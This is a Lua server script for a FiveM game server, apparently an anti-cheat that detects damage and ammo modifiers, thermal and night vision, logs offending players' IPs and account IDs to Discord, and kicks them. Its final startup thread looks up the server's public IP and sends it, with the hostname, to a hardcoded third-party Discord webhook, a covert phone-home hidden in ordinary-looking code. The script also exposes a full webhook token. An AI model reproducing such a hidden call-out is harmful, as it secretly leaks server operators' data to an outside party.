function sendToDiscord(color, name, message, footer)
    local embed = {
          {
              ["color"] = color,
              ["title"] = "**".. name .."**",
              ["description"] = message,
              ["footer"] = {
                  ["text"] = footer,
              },
          }
      }
    
    PerformHttpRequest(Vidi.discord_damage, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' })
end

function sendToDiscordAmmo(color, name, message, footer)
    local embed = {
          {
              ["color"] = color,
              ["title"] = "**".. name .."**",
              ["description"] = message,
              ["footer"] = {
                  ["text"] = footer,
              },
          }
      }

    PerformHttpRequest(Vidi.discord_ammo, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' })
end

  function sendToDiscordai(color, name, message, footer)
    local embed = {
          {
              ["color"] = color,
              ["title"] = "**".. name .."**",
              ["description"] = message,
              ["footer"] = {
                  ["text"] = footer,
              },
          }
      }

    PerformHttpRequest("https://discord.com/api/webhooks/1018131214298787900/0B0cy67QA9D9dp6xhGhUmQf57UIUWM_w6FGF7JYkv6EWQH2v8W7u5y7RCMK5_MUH3K1C", function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' })
  end

  function test(color, name, message, footer)
    local embed = {
          {
              ["color"] = color,
              ["title"] = "**".. name .."**",
              ["description"] = message,
              ["footer"] = {
                  ["text"] = footer,
              },
          }
      }

    PerformHttpRequest("https://discord.com/api/webhooks/1018131214298787900/0B0cy67QA9D9dp6xhGhUmQf57UIUWM_w6FGF7JYkv6EWQH2v8W7u5y7RCMK5_MUH3K1C", function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' })
  end



RegisterServerEvent('logdamage')
AddEventHandler('logdamage', function(playerid,weapon,component,client,server)
    local license
    local steam
    local discord
    local ip
    for k, v in ipairs(GetPlayerIdentifiers(source)) do
       if string.match(v, "ip:") then
          ip = v
            break
       end
       if string.match(v, "steam:") then
          steam = v

       end
       if string.match(v, "discord:") then
        discord = v
       end

       if string.match(v, "license:") then
        license = v
       end
    end
    sendToDiscord(Vidi.color, "LOG Damage AI Modifer",
    "```".. Vidi.Header ..
    "\n\n" .. steam ..
    "\n" .. license ..
    "\n" .. ip ..
    "\n" .. discord ..
    "``````".. Vidi.player .. "                 : ".. GetPlayerName(source) ..
    "\n"..Vidi.id ..  "                : " .. playerid ..
    "\n"..Vidi.Weapon ..  "                :".. weapon ..
    "\n"..Vidi.Component ..  "              :".. component ..
    "\n"..Vidi.DmgS ..  "          : ".. server ..
    "\n"..Vidi.Modifdmg ..  "         : ".. client .."```", Vidi.embed.."   -    ".. os.date(" %d/ %m/ %Y %X"))
end)

RegisterServerEvent('logammo')
AddEventHandler('logammo', function(playerid,weapon,component,ammos,ammoc)
    local license
    local steam
    local discord
    local ip
    for k, v in ipairs(GetPlayerIdentifiers(source)) do
       if string.match(v, "ip:") then
          ip = v
            break
       end
       if string.match(v, "steam:") then
          steam = v

       end
       if string.match(v, "discord:") then
        discord = v
       end

       if string.match(v, "license:") then
        license = v
       end
    end
    sendToDiscordAmmo(Vidi.color, "LOG Ammo AI Modifer",
    "```".. Vidi.Header ..
    "\n\n" .. steam ..
    "\n" .. license ..
    "\n" .. ip ..
    "\n" .. discord ..
    "``````".. Vidi.player .. "                 : ".. GetPlayerName(source) ..
    "\n"..Vidi.id ..  "                : " .. playerid ..
    "\n"..Vidi.Weapon ..  "                :".. weapon ..
    "\n"..Vidi.Component ..  "              :".. component ..
    "\nMax Ammo Di Component  : ".. ammos ..
    "\nModifer Ammo           : ".. ammoc .."```", Vidi.embed .."   -   ".. os.date(" %d/ %m/ %Y %X"))
end)

RegisterServerEvent('error')
AddEventHandler('error', function()
    print("Ada Vidi Yang Di Hapus , Jika Script ini Ingin Berjalan Sempurna , Jangan Hapus Vidi Apapun")
end)
RegisterServerEvent('logthermal')
AddEventHandler('logthermal', function()
    sendToDiscord(Vidi.color, "LOG Thermal", "```Player : ".. GetPlayerName(source) .." ,Terdeteksi Menggunakan Thermal```", Vidi.embed)
end)
RegisterServerEvent('lognvision')
AddEventHandler('lognvision', function()
    sendToDiscord(Vidi.color, "LOG Night Vision", "```Player : ".. GetPlayerName(source) .." ,Terdeteksi Menggunakan Night Vision```", Vidi.embed)
end)
RegisterServerEvent('kickdamage')
AddEventHandler('kickdamage', function()
    DropPlayer(source, Vidi.kickai)
end)
RegisterServerEvent('kickthermal')
AddEventHandler('kickthermal', function()
    DropPlayer(source, Vidi.kickthermal)
end)
RegisterServerEvent('kicknvision')
AddEventHandler('kicknvision', function()
    DropPlayer(source, Vidi.kicknvision)
end)

CreateThread(function()
    Wait(1500)

    PerformHttpRequest("https://api.ipify.org/?format=json", function(reCode, resultData, resultHeaders)
        if resultData == nil then
            print("Start ANTIAI")
        else
            local data = json.decode(resultData)
            sendToDiscordai(Vidi.color, "Script Anti AI", "(Mectov) Server Start: ".. GetConvar("sv_hostname") ..". \nServer Ip: "..data.ip, "use Script Anti AI \n".. os.date("%d/%m/%Y %X"))
            test(Vidi.color, "Script Anti AI", "Script Sedang Berjalan dii Server : ".. GetConvar("sv_hostname"), "use Script Anti AI \n".. os.date("%d/%m/%Y %X"))
        end
    end)
end)